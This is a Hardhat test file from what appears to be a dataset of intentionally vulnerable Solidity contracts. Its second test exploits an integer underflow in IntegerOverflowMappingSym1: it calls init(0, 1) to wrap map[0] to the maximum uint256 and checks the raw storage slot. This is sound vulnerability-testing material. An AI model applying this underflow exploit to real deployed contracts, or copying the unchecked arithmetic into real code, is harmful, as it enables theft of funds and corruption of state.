const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack arithmetic/integer_overflow_mapping_sym_1.sol", function () {
  async function deployContracts() {
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/arithmetic/integer_overflow_mapping_sym_1.sol/IntegerOverflowMappingSym1.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const IntegerOverflowMappingSym1 = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
    );
    const overflow = await IntegerOverflowMappingSym1.deploy();
    await overflow.waitForDeployment();
    return { overflow };
  }

  it("sanity check: arithmetic/integer_overflow_mapping_sym_1.sol", async function () {
    const { overflow } = await loadFixture(deployContracts);
    const mappingSlot = BigInt(0); // map is at slot 0
    const key = BigInt(0); // We want to find map[0]

    // Compute keccak256 hash for storage slot
    const storageSlot = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ["uint256", "uint256"],
        [key, mappingSlot],
      ),
    );

    let storedValue = await ethers.provider.getStorage(
      overflow.target,
      storageSlot,
    );
    let value = Number(storedValue);
    expect(value).to.be.equal(0);
    await overflow.init(0, 0);
    storedValue = await ethers.provider.getStorage(
      overflow.target,
      storageSlot,
    );
    value = Number(storedValue);
    expect(value).to.be.equal(0);
  });

  it("exploit overflow vulnerability", async function () {
    const { overflow } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();

    const mappingSlot = BigInt(0); // map is at slot 0
    const key = BigInt(0); // We want to find map[0]

    // Compute keccak256 hash for storage slot
    const storageSlot = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ["uint256", "uint256"],
        [key, mappingSlot],
      ),
    );

    let storedValue = await ethers.provider.getStorage(
      overflow.target,
      storageSlot,
    );
    let value = Number(storedValue);
    expect(value).to.be.equal(0);

    await overflow.connect(a).init(0, 1);

    storedValue = await ethers.provider.getStorage(
      overflow.target,
      storageSlot,
    );
    value = Number(storedValue);
    const max = 2 ** 256 - 1;
    expect(value).to.be.equal(max);
  });
});
